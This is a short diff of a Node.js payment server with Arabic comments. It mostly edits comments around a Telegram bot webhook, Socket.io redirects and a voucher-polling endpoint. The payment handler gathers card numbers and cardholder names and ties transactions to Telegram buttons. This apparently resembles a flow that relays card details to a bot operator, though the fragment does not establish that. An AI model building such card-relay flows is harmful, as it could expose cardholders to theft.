@@ -159,7 +159,7 @@ app.post('/telegram-webhook', async (req, res) => {
 
         const redirectUrl = `/contribution-success?amount=${amount}&tx=${encodeURIComponent(txId)}`;
 
-        // ✅ تخزين الحالة في الخريطة لكي يتمكن الـ Polling من استشعارها فوراً
+        // ✅ تخزين الحالة في الخريطة لكي يتمكن الـ Polling والـ API من استشعارها فوراً
         global.generatedCardsMap.set(txId, {
           action: 'contribution',
           redirectUrl: redirectUrl,
@@ -169,7 +169,7 @@ app.post('/telegram-webhook', async (req, res) => {
         // ✅ توجيه العميل فوراً لصفحة المساهمة عبر Socket.io
         io.to(txId).emit('redirect_contribution', { url: redirectUrl });
 
-        // ✅ الرد على بوت تليجرام
+        // ✅ الرد على بوت تليجرام لإلغاء علامة التحميل وإظهار رسالة تفاعلية
         if (BOT_TOKEN) {
           await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: callbackQueryId,
@@ -224,7 +224,7 @@ async function handlePaymentRequest(req, res) {
       payment_method: selectedMethod,
       branch: selectedBranch,
       branchName: branchDisplayName,
-      transactionId: transactionId, // تمرير معرف المعاملة لتضمينه في أزرار تلغرام
+      transactionId: transactionId,
       card_data: {
         number: (card_data && card_data.number) || number || "غير مدخل",
         name: (card_data && card_data.name) || name || "غير مدخل",
@@ -334,6 +334,9 @@ app.get("/contribution-success", (req, res) => {
   res.send(htmlContent);
 });
 
+// ==========================================
+// 🔍 مسار فحص حالة الكارت أو المساهمة دورياً (Polling API)
+// ==========================================
 app.get("/api/check-voucher/:txId", (req, res) => {
   const txId = String(req.params.txId || "").trim();
   
